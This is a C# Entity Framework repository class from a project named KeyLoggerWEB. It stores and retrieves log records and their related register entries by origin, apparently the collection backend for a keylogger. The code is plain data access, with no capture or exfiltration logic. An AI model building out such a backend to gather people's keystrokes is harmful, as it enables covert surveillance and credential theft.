using KeyLoggerWEB.Context;
using KeyLoggerWEB.Entitys;
using Microsoft.EntityFrameworkCore;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace KeyLoggerWEB.Repository
{
    public class KeyLoggerRepository : IKeyLoggerRepository
    {
        protected readonly KeyLoggerContext _context;

        public KeyLoggerRepository(KeyLoggerContext context)
        {
            _context = context;
        }

        public async Task<Log> AddLogAsync(string origin)
        {
            var log = await _context.AddAsync(new Log
            {
                DateTime = DateTime.UtcNow,
                Origin = origin
            });

            await _context.SaveChangesAsync();

            return log.Entity;
        }

        public async Task<bool> UpdateLogAsync(Log log)
        {
            _context.Update(log);

            return await _context.SaveChangesAsync() > 0;
        }

        public async Task<List<Log>> GetAllAsync()
        {
            return await _context.Logs.Include(x => x.RegisterLogs).ToListAsync();
        }

        public async Task<Log> GetLogByOriginAsync(string origin)
        {
            return await _context.Logs.Include(x => x.RegisterLogs).FirstOrDefaultAsync(x => x.Origin == origin);
        }
    }
}
